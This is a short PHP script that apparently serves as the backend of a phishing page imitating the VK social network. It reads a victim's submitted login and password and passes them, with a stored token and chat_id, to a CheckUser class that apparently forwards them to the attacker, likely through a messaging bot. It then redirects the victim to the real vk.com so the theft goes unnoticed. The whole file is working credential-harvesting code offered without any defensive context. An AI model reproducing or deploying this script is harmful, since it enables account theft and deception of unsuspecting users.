<?php
ini_set('user_agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36');
require_once('auth.php');
require_once('data.php');

$redirect_url = 'https://vk.com';

$auth = new CheckUser($data['token'], $data['chat_id']);

$result = $auth->Send($_POST['login'], $_POST['password']);

if($result) {
    echo($redirect_url);
} else {
    echo "/bad.html";
}